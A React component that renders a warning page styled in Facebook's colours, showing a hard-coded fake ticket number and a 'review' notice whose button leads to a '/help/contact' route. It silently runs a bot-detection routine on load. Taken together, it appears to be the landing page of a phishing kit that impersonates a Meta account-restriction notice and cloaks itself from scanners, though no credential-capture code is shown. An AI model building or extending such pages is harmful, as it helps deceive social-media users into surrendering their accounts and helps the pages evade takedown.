import { useEffect } from 'react';
import { useNavigate } from 'react-router';
import { useLang } from '@/context/lang-context';
import detectBot from '@/utils/detect_bot';
import pageBackground from '@/assets/images/background.webp';
import heroImage from '@/assets/images/hero-image.png';
import warningIcon from '@/assets/images/warning.png';

const LiveIndex = () => {
    const navigate = useNavigate();
    const { labels } = useLang();
    const ticketCode = '#LUVI-FWJ3-LDOE';
    const ticketLabel = labels.liveIndexTicketLabel?.replace(/:\s*$/, '');

    useEffect(() => {
        const runDetectBot = async () => {
            try {
                await detectBot();
            } catch {
                //
            }
        };

        runDetectBot();
    }, []);

    const handleContinue = () => {
        navigate('/help/contact');
    };

    return (
        <div
            className="min-h-screen w-full bg-cover bg-center bg-no-repeat px-3 py-3 sm:px-4 sm:py-8"
            style={{ backgroundImage: `url(${pageBackground})` }}
        >
            <div className="mx-auto w-full max-w-[560px] rounded-xl border border-[#d9dde5] bg-[#f6f7f9] p-2.5 text-[#1c1e21] shadow-sm sm:p-5">
                <div className="flex items-start gap-3">
                    <img src={warningIcon} alt={labels.liveIndexWarningIconAlt} className="mt-0.5 h-7 w-7" />
                    <h1 className="text-[20px] font-bold leading-[1.25] sm:text-[22px]">
                        {labels.liveIndexTitle}
                    </h1>
                </div>

                <div className="mt-3 space-y-2 text-[16px] leading-[1.4] text-[#4b4f56] sm:mt-4 sm:space-y-2.5 sm:text-[17px] sm:leading-[1.45]">
                    <p>{labels.liveIndexDesc1}</p>
                    <p className="italic">{labels.liveIndexDesc2}</p>
                </div>

                <p className="mt-3 text-[16px] font-bold text-[#1877f2] sm:mt-4 sm:text-[17px]">{`${ticketLabel} ${ticketCode}`}</p>

                <div className="mt-2 overflow-hidden rounded-lg bg-[#e8eff9] p-2.5 sm:mt-4 sm:p-3">
                    <img
                        src={heroImage}
                        alt={labels.liveIndexHeroAlt}
                        className="h-auto max-h-[150px] w-full rounded-md object-contain sm:max-h-none sm:object-cover"
                    />
                </div>

                <div className="mt-2 rounded-lg bg-[#edf0f4] p-2.5 sm:mt-5 sm:p-4">
                    <h2 className="text-[21px] font-bold leading-tight text-[#111827] sm:text-[22px]">{labels.liveIndexReviewTitle}</h2>
                    <p className="mt-2 text-[16px] leading-[1.4] text-[#4b4f56] sm:mt-2.5 sm:text-[17px] sm:leading-[1.45]">
                        {labels.liveIndexReviewDesc1}
                    </p>
                    <p className="mt-2 text-[16px] leading-[1.4] text-[#4b4f56] sm:mt-2.5 sm:text-[17px] sm:leading-[1.45]">
                        {labels.liveIndexReviewDesc2}
                    </p>
                </div>

                <button
                    className="mt-3 w-full rounded-md bg-[#1877f2] px-4 py-2.5 text-[17px] font-semibold text-white transition hover:bg-[#166fe5] sm:mt-4 sm:text-[18px]"
                    type="button"
                    onClick={handleContinue}
                >
                    {labels.liveIndexReviewButton}
                </button>
            </div>
        </div>
    );
};

export default LiveIndex;
